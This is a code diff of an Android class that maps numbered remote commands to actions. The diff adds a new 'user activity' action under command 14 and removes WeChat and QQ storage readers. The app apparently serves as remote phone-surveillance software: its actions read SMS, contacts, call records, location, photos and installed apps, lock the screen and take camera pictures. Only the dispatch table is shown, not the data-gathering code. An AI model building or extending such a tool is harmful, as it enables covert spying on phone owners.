@@ -4,31 +4,17 @@ import java.util.HashMap;
 import java.util.Map;
 import android.annotation.TargetApi;
 import android.os.Build;
-
 import com.lfish.control.action.actiondomian.GetCallRecodeAction;
 import com.lfish.control.action.actiondomian.GetContactAction;
 import com.lfish.control.action.actiondomian.GetDeviceMsgAction;
 import com.lfish.control.action.actiondomian.GetInstallAppsAction;
 import com.lfish.control.action.actiondomian.GetLocationAction;
 import com.lfish.control.action.actiondomian.GetPhotosAction;
-import com.lfish.control.action.actiondomian.GetQQSdAction;
 import com.lfish.control.action.actiondomian.GetSmsAction;
-import com.lfish.control.action.actiondomian.GetWeChatSdAction;
+import com.lfish.control.action.actiondomian.GetUserAcitivityAction;
 import com.lfish.control.action.actiondomian.LockScreenAction;
 import com.lfish.control.action.actiondomian.TackPhoto_BackAction;
 import com.lfish.control.action.actiondomian.TackPhoto_FrontAction;
-import com.lfish.control.action.cmddomian.GetCallRecodeCmd;
-import com.lfish.control.action.cmddomian.GetContactsCmd;
-import com.lfish.control.action.cmddomian.GetDeviceMsgCmd;
-import com.lfish.control.action.cmddomian.GetInstallAppsCmd;
-import com.lfish.control.action.cmddomian.GetLocationCmd;
-import com.lfish.control.action.cmddomian.GetPhotosCmd;
-import com.lfish.control.action.cmddomian.GetQQSdCmd;
-import com.lfish.control.action.cmddomian.GetSmsCmd;
-import com.lfish.control.action.cmddomian.GetWeChatSdCmd;
-import com.lfish.control.action.cmddomian.LockScreenCmd;
-import com.lfish.control.action.cmddomian.TackPhoto_BackCmd;
-import com.lfish.control.action.cmddomian.TackPhoto_FrontCmd;
 
 public class ActionFactory {
 	
@@ -59,10 +45,9 @@ public class ActionFactory {
 		actionSet.put(2, GetContactAction.class);
 		actionSet.put(12, GetSmsAction.class);
 		actionSet.put(6, GetCallRecodeAction.class);
-//		actionSet.put(new GetWeChatSdCmd().getCmdNumber(), GetWeChatSdAction.class);
-//		actionSet.put(new GetQQSdCmd().getCmdNumber(), GetQQSdAction.class);
 		actionSet.put(11, LockScreenAction.class);
-		actionSet.put(13, this.getClass()); // 拦截
+		actionSet.put(13, this.getClass()); // 拦截,无需配置
+		actionSet.put(14, GetUserAcitivityAction.class); // 拦截,无需配置
 		
 	}
 	
